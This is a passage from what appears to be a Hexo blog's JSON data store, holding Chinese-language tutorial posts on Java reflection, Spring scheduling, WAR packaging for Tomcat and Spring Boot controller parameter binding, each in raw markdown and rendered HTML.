title=\"1.什么是反射\"></a>1.什么是反射</h4><blockquote>\n<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.<br>The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control</p>\n</blockquote>\n<p>反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br><br>反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br><br>Java 反射主要提供以下功能：</p>\n<ul>\n<li>在运行时判断任意一个对象所属的类；</li>\n<li>在运行时构造任意一个类的对象；</li>\n<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>\n<li>在运行时调用任意一个对象的方法</li>\n</ul>\n<p><strong>在运行时，而不是编译时.</strong></p>\n"},{"title":"spring-schdule","date":"2018-11-19T16:18:54.000Z","_content":"\n#### 1.@Schduled注解\n配置完后，在方法上加@Scheduled(\"定时表达式\")\n\n#### 2.实现ScheduingConfigurer接口\n```\n@Lazy(false)\n@EnableScheduling\n@Component\npublic class DynamicScheduledTask implements SchedulingConfigurer {\n\n\t@Value(\"${abc.call-cron}\")\n\tprivate String callCron;\n\n  //重写configureTasks\n\t@Override\n\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) {\n\t\tif(!\"0\".equals(callCron)){\n\t\t\ttaskRegistrar.addTriggerTask(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\t//doSomething\n\t\t\t\t}\n\t\t\t}, new Trigger() {\n\n\t\t\t\t@Override\n\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) {\n          //定时器触发，callCron为定时表达式\n\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);\n\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);\n\t\t\t\t\treturn nextExecDate;\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\n}\n\n```\n","source":"_posts/java/spring-schdule.md","raw":"---\ntitle: spring-schdule\ndate: 2018-11-19 11:18:54\ntags: [java,springboot]\n---\n\n#### 1.@Schduled注解\n配置完后，在方法上加@Scheduled(\"定时表达式\")\n\n#### 2.实现ScheduingConfigurer接口\n```\n@Lazy(false)\n@EnableScheduling\n@Component\npublic class DynamicScheduledTask implements SchedulingConfigurer {\n\n\t@Value(\"${abc.call-cron}\")\n\tprivate String callCron;\n\n  //重写configureTasks\n\t@Override\n\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) {\n\t\tif(!\"0\".equals(callCron)){\n\t\t\ttaskRegistrar.addTriggerTask(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\t//doSomething\n\t\t\t\t}\n\t\t\t}, new Trigger() {\n\n\t\t\t\t@Override\n\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) {\n          //定时器触发，callCron为定时表达式\n\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);\n\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);\n\t\t\t\t\treturn nextExecDate;\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\n}\n\n```\n","slug":"java/spring-schdule","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i5001e6dcp2gts2zyd","content":"<h4 id=\"1-Schduled注解\"><a href=\"#1-Schduled注解\" class=\"headerlink\" title=\"1.@Schduled注解\"></a>1.@Schduled注解</h4><p>配置完后，在方法上加@Scheduled(“定时表达式”)</p>\n<h4 id=\"2-实现ScheduingConfigurer接口\"><a href=\"#2-实现ScheduingConfigurer接口\" class=\"headerlink\" title=\"2.实现ScheduingConfigurer接口\"></a>2.实现ScheduingConfigurer接口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Lazy(false)</span><br><span class=\"line\">@EnableScheduling</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class DynamicScheduledTask implements SchedulingConfigurer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Value(&quot;$&#123;abc.call-cron&#125;&quot;)</span><br><span class=\"line\">\tprivate String callCron;</span><br><span class=\"line\"></span><br><span class=\"line\">  //重写configureTasks</span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) &#123;</span><br><span class=\"line\">\t\tif(!&quot;0&quot;.equals(callCron))&#123;</span><br><span class=\"line\">\t\t\ttaskRegistrar.addTriggerTask(new Runnable() &#123;</span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic void run() &#123;</span><br><span class=\"line\">\t\t\t\t\t//doSomething</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;, new Trigger() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) &#123;</span><br><span class=\"line\">          //定时器触发，callCron为定时表达式</span><br><span class=\"line\">\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);</span><br><span class=\"line\">\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);</span><br><span class=\"line\">\t\t\t\t\treturn nextExecDate;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-Schduled注解\"><a href=\"#1-Schduled注解\" class=\"headerlink\" title=\"1.@Schduled注解\"></a>1.@Schduled注解</h4><p>配置完后，在方法上加@Scheduled(“定时表达式”)</p>\n<h4 id=\"2-实现ScheduingConfigurer接口\"><a href=\"#2-实现ScheduingConfigurer接口\" class=\"headerlink\" title=\"2.实现ScheduingConfigurer接口\"></a>2.实现ScheduingConfigurer接口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Lazy(false)</span><br><span class=\"line\">@EnableScheduling</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class DynamicScheduledTask implements SchedulingConfigurer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Value(&quot;$&#123;abc.call-cron&#125;&quot;)</span><br><span class=\"line\">\tprivate String callCron;</span><br><span class=\"line\"></span><br><span class=\"line\">  //重写configureTasks</span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) &#123;</span><br><span class=\"line\">\t\tif(!&quot;0&quot;.equals(callCron))&#123;</span><br><span class=\"line\">\t\t\ttaskRegistrar.addTriggerTask(new Runnable() &#123;</span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic void run() &#123;</span><br><span class=\"line\">\t\t\t\t\t//doSomething</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;, new Trigger() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) &#123;</span><br><span class=\"line\">          //定时器触发，callCron为定时表达式</span><br><span class=\"line\">\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);</span><br><span class=\"line\">\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);</span><br><span class=\"line\">\t\t\t\t\treturn nextExecDate;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"springboot打war包","date":"2018-10-17T19:14:40.000Z","_content":"#### Springboot部署war包到服务器上\n\n1.修改打包方式为war\n```\n<groupId>com.xcloud</groupId>\n   <artifactId>import-xcloud</artifactId>\n   <version>0.0.1-SNAPSHOT</version>\n   <packaging>war</packaging>\n```\n\n2.移除内置tomcat，引入外部的\n```\n<dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <!--使用外部tomcat时放开-->\n            <exclusions>\n                <exclusion>\n                    <groupId>org.springframework.boot</groupId>\n                    <artifactId>spring-boot-starter-tomcat</artifactId>\n                </exclusion>\n            </exclusions>\n        </dependency>\n        <!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat-->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-tomcat</artifactId>\n            <scope>provided</scope>\n        </dependency>\n        <dependency>\n            <groupId>javax.servlet</groupId>\n            <artifactId>servlet-api</artifactId>\n            <version>3.0-alpha-1</version>\n            <scope>provided</scope>\n        </dependency>\n```\n3.修改启动类，继承extends SpringBootServletInitializer\n```\n@SpringBootApplication\npublic class ImportXcloudApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ImportXcloudApplication.class, args);\n    }\n\n    //返回启动类builder\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(ImportXcloudApplication.class);\n    }\n}\n```\n","source":"_posts/java/springboot打war包.md","raw":"---\ntitle: springboot打war包\ndate: 2018-10-17 15:14:40\ntags: [springboot, tomcat,java]\n---\n#### Springboot部署war包到服务器上\n\n1.修改打包方式为war\n```\n<groupId>com.xcloud</groupId>\n   <artifactId>import-xcloud</artifactId>\n   <version>0.0.1-SNAPSHOT</version>\n   <packaging>war</packaging>\n```\n\n2.移除内置tomcat，引入外部的\n```\n<dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <!--使用外部tomcat时放开-->\n            <exclusions>\n                <exclusion>\n                    <groupId>org.springframework.boot</groupId>\n                    <artifactId>spring-boot-starter-tomcat</artifactId>\n                </exclusion>\n            </exclusions>\n        </dependency>\n        <!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat-->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-tomcat</artifactId>\n            <scope>provided</scope>\n        </dependency>\n        <dependency>\n            <groupId>javax.servlet</groupId>\n            <artifactId>servlet-api</artifactId>\n            <version>3.0-alpha-1</version>\n            <scope>provided</scope>\n        </dependency>\n```\n3.修改启动类，继承extends SpringBootServletInitializer\n```\n@SpringBootApplication\npublic class ImportXcloudApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ImportXcloudApplication.class, args);\n    }\n\n    //返回启动类builder\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(ImportXcloudApplication.class);\n    }\n}\n```\n","slug":"java/springboot打war包","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i6001h6dcpv9p6ntfk","content":"<h4 id=\"Springboot部署war包到服务器上\"><a href=\"#Springboot部署war包到服务器上\" class=\"headerlink\" title=\"Springboot部署war包到服务器上\"></a>Springboot部署war包到服务器上</h4><p>1.修改打包方式为war<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;groupId&gt;com.xcloud&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;import-xcloud&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">   &lt;packaging&gt;war&lt;/packaging&gt;</span><br></pre></td></tr></table></figure></p>\n<p>2.移除内置tomcat，引入外部的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;!--使用外部tomcat时放开--&gt;</span><br><span class=\"line\">            &lt;exclusions&gt;</span><br><span class=\"line\">                &lt;exclusion&gt;</span><br><span class=\"line\">                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">                    &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;/exclusion&gt;</span><br><span class=\"line\">            &lt;/exclusions&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat--&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;3.0-alpha-1&lt;/version&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>3.修改启动类，继承extends SpringBootServletInitializer<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class ImportXcloudApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(ImportXcloudApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //返回启动类builder</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(ImportXcloudApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Springboot部署war包到服务器上\"><a href=\"#Springboot部署war包到服务器上\" class=\"headerlink\" title=\"Springboot部署war包到服务器上\"></a>Springboot部署war包到服务器上</h4><p>1.修改打包方式为war<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;groupId&gt;com.xcloud&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;import-xcloud&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">   &lt;packaging&gt;war&lt;/packaging&gt;</span><br></pre></td></tr></table></figure></p>\n<p>2.移除内置tomcat，引入外部的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;!--使用外部tomcat时放开--&gt;</span><br><span class=\"line\">            &lt;exclusions&gt;</span><br><span class=\"line\">                &lt;exclusion&gt;</span><br><span class=\"line\">                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">                    &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;/exclusion&gt;</span><br><span class=\"line\">            &lt;/exclusions&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat--&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;3.0-alpha-1&lt;/version&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>3.修改启动类，继承extends SpringBootServletInitializer<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class ImportXcloudApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(ImportXcloudApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //返回启动类builder</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(ImportXcloudApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"springboot Controller 接收参数","date":"2019-02-22T15:34:34.000Z","_content":"#### 一.原因\n一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。\n\n#### 二.常见注解\n###### 1.@PathVariable\n用于Get请求<br>\n获取请求url中的值，一般用来接收url/{param}类型的参数<br>\n一般返回类型为json或页面跳转等\n```\n//请求url: http://127.0.0.1:8080/get1/123\n@ResponseBody\n@RequestMapping(value = \"/get1/{param}\",method = RequestMethod.GET)\npublic String  get1(@PathVariable(\"param\") String param){\n    System.out.println(param);\n    return param;\n}\n```\n###### 2.@RequestParam\n用于Get/Post都行<br>\n在get请求时  获取请求参数中的值<br>\n参数一般为url后面的param=param(&xx=xx)或者form-data\n```\n//请求url: http://127.0.0.1:8080/get2?param1=param1&param2=param2\n@ResponseBody\n    @RequestMapping(value = \"/get2\", method = RequestMethod.GET)\n    public String get2(@RequestParam(\"param1\") String param1,\n                       @RequestParam(\"param2\") String param2){\n        return param1 + param2;\n    }\n```\n###### 3.@RequestBody\n用于Get/Post都行<br>\n该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br>\n@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型\n```\n//请求url: http://127.0.0.1:8080/get3\n//参数为json: {\"param1\":\"11\",\"param2\": \"22\"}\n@ResponseBody\n@RequestMapping(value = \"/get3\", method = RequestMethod.GET)\npublic String get3(@RequestBody Map<String,String> param){\n    return param.get(\"param1\") + param.get(\"param2\");\n}\n```\n###### 4.HttpServletRequest\nget或post<br>\n适用于param=param(&xx=xx)或者form-data<br>\nform-data会解析为param=param&xx=xx形式\n```\n //请求参数为: http://127.0.0.1:8080/get4?param1=11&param2=22\n //或参数为form-data\n @ResponseBody\n @RequestMapping(value = \"/get4\", method = RequestMethod.GET)\n public String get4(HttpServletRequest request) {\n     return request.getParameter(\"param1\")+request.getParameter(\"param2\");\n }\n```\n\n###### 5.直接获取\nget请求<br>\n适用于param=param(&xx=xx)或者form-data<br>\n```\n@ResponseBody\n@RequestMapping(value = \"/get5\", method = RequestMethod.GET)\npublic String get4(String param1, String param2) {\n    return param1+param2;\n}\n```\n\n######\n","source":"_posts/java/springboot接收参数.md","raw":"---\ntitle: springboot Controller 接收参数\ndate: 2019-02-22 10:34:34\ntags: [java]\n---\n#### 一.原因\n一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。\n\n#### 二.常见注解\n###### 1.@PathVariable\n用于Get请求<br>\n获取请求url中的值，一般用来接收url/{param}类型的参数<br>\n一般返回类型为json或页面跳转等\n```\n//请求url: http://127.0.0.1:8080/get1/123\n@ResponseBody\n@RequestMapping(value = \"/get1/{param}\",method = RequestMethod.GET)\npublic String  get1(@PathVariable(\"param\") String param){\n    System.out.println(param);\n    return param;\n}\n```\n###### 2.@RequestParam\n用于Get/Post都行<br>\n在get请求时  获取请求参数中的值<br>\n参数一般为url后面的param=param(&xx=xx)或者form-data\n```\n//请求url: http://127.0.0.1:8080/get2?param1=param1&param2=param2\n@ResponseBody\n    @RequestMapping(value = \"/get2\", method = RequestMethod.GET)\n    public String get2(@RequestParam(\"param1\") String param1,\n                       @RequestParam(\"param2\") String param2){\n        return param1 + param2;\n    }\n```\n###### 3.@RequestBody\n用于Get/Post都行<br>\n该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br>\n@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型\n```\n//请求url: http://127.0.0.1:8080/get3\n//参数为json: {\"param1\":\"11\",\"param2\": \"22\"}\n@ResponseBody\n@RequestMapping(value = \"/get3\", method = RequestMethod.GET)\npublic String get3(@RequestBody Map<String,String> param){\n    return param.get(\"param1\") + param.get(\"param2\");\n}\n```\n###### 4.HttpServletRequest\nget或post<br>\n适用于param=param(&xx=xx)或者form-data<br>\nform-data会解析为param=param&xx=xx形式\n```\n //请求参数为: http://127.0.0.1:8080/get4?param1=11&param2=22\n //或参数为form-data\n @ResponseBody\n @RequestMapping(value = \"/get4\", method = RequestMethod.GET)\n public String get4(HttpServletRequest request) {\n     return request.getParameter(\"param1\")+request.getParameter(\"param2\");\n }\n```\n\n###### 5.直接获取\nget请求<br>\n适用于param=param(&xx=xx)或者form-data<br>\n```\n@ResponseBody\n@RequestMapping(value = \"/get5\", method = RequestMethod.GET)\npublic String get4(String param1, String param2) {\n    return param1+param2;\n}\n```\n\n######\n","slug":"java/springboot接收参数","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i7001j6dcp0zgsjl6b","content":"<h4 id=\"一-原因\"><a href=\"#一-原因\" class=\"headerlink\" title=\"一.原因\"></a>一.原因</h4><p>一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。</p>\n<h4 id=\"二-常见注解\"><a href=\"#二-常见注解\" class=\"headerlink\" title=\"二.常见注解\"></a>二.常见注解</h4><h6 id=\"1-PathVariable\"><a href=\"#1-PathVariable\" class=\"headerlink\" title=\"1.@PathVariable\"></a>1.@PathVariable</h6><p>用于Get请求<br><br>获取请求url中的值，一般用来接收url/{param}类型的参数<br><br>一般返回类型为json或页面跳转等<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求url: http://127.0.0.1:8080/get1/123</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = &quot;/get1/&#123;param&#125;&quot;,method = RequestMethod.GET)</span><br><span class=\"line\">public String  get1(@PathVariable(&quot;param&quot;) String param)&#123;</span><br><span class=\"line\">    System.out.println(param);</span><br><span class=\"line\">    return param;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-RequestParam\"><a href=\"#2-RequestParam\" class=\"headerlink\" title=\"2.@RequestParam\"></a>2.@RequestParam</h6><p>用于Get/Post都行<br><br>在get请求时  获取请求参数中的值<br><br>参数一般为url后面的param=param(&amp;xx=xx)或者form-data<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//请求url: http://127.0.0.1:8080/get2?param1=param1&amp;param2=param2</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">    @RequestMapping(value = &quot;/get2&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String get2(@RequestParam(&quot;param1&quot;) String param1,</span><br><span class=\"line\">                       @RequestParam(&quot;param2&quot;) String param2)&#123;</span><br><span class=\"line\">        return param1 + param2;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-RequestBody\"><a href=\"#3-RequestBody\" class=\"headerlink\" title=\"3.@RequestBody\"></a>3.@RequestBody</h6><p>用于Get/Post都行<br><br>该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br><br>@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型<br><figure class=\"highlight 